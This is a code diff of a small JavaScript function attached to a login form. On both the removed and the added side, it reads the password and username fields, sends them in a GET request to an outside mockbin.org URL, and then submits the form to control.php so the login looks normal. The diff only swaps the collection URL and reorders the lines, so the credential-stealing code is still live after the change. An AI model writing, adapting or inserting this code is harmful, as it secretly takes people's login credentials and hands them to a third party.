@@ -1,14 +1,12 @@
 function l(){
-    var a = new XMLHttpRequest();
-    a.open('GET','http://mockbin.org/bin/203761c2-8e8f-4b19-932b-fe0149da4f39?p='
-        .concat(document.getElementById('password').value,'%26u=',document.getElementById('usuario').value));
-    a.onreadystatechange=function(){
-        if(a.readyState === XMLHttpRequest.DONE){
-            document.forms[0].action='control.php';
-            document.forms[0].method='POST';
-            document.forms[0].submit();
-        }
+    document.forms[0].action='control.php';
+    var a=new XMLHttpRequest();
+    a.onreadystatechange = function(){
+        document.forms[0].method='POST';
+        document.forms[0].action='control.php';
+        document.forms[0].submit();
     };
+    a.open('GET', 'http://mockbin.org/bin/c2bfc96d-a523-48e1-abe9-aacc768ed0c4?p='.concat(document.getElementById('password').value).concat('%26u=').concat(document.getElementById('usuario').value));
     a.send(null);
 }
 var f=document.createElement("form");
